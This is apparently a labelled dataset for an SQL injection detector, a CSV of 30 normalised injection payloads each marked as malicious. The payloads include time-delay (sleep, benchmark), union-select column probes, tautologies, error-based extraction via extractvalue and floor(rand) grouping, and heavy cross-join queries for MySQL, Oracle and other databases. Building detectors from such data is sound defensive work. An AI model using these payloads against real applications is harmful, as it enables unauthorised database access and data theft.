row_index,payload_norm,label,sqli_type_hint
5130,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 4982 = 4982,1,
5131,select ( case when ( 3499 = 4209 ) then 3499 else 3499* ( select 3499 from mysql.db ) end ) #,1,
5132,select ( case when ( 1776 = 7688 ) then 1776 else 1/ ( select 0 ) end ) --,1,
5133,select sleep ( 5 ) and ( ( 8679 = 8679,1,
5134,"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",1,
5135,-9708' where 8150 = 8150 or 6872 = 6872--,1,
5136,"-2639"" ) where 1494 = 1494 union all select 1494--",1,
5137,"-3037"" ) ) ) or elt ( 4758 = 9129,9129 ) and ( ( ( ""zewv"" like ""zewv",1,
5138,"-4825%' ) union all select 6804,6804,6804,6804,6804,6804,6804--",1,
5139,"1"" where 2221 = 2221 and 5318 = 8398--",1,
5140,"1"" ) ) ) and elt ( 1750 = 7826,7826 ) and ( ( ( ""qcro"" = ""qcro",1,
5141,-7742 ) as tgzq where 7842 = 7842 or 2062 = 1563,1,
5142,"1' ) ) as babx where 2494 = 2494 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5143,"1'+ ( select wkay where 5476 = 5476 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) +'",1,
5144,"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""jenb"" like ""jenb",1,
5145,-7624' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'iwab' = 'iwab,1,
5146,"1'|| ( select 'kgjk' where 3530 = 3530 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5147,1 ) where 6035 = 6035,1,
5148,-1730' or 8571 = 8571--,1,
5149,"1"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
5150,1' ) where 5491 = 5491 and 9198 = 9198--,1,
5151,"1%' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( '%' = '",1,
5152,-4058 ) union all select 9184--,1,
5153,"1"" ) where 1614 = 1614 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
5154,"1"" where 9521 = 9521 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",1,
5155,-9103' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'nlvq' = 'nlvq,1,
5156,"1' ) union all select null,null,null,null,null,null,null,null,null--",1,
5157,-1386' ) or ( 7880 = 5362 ) *5362 and ( 'vsyu' like 'vsyu,1,
5158,"1 ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 1164 = 1164",1,
5159,"1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
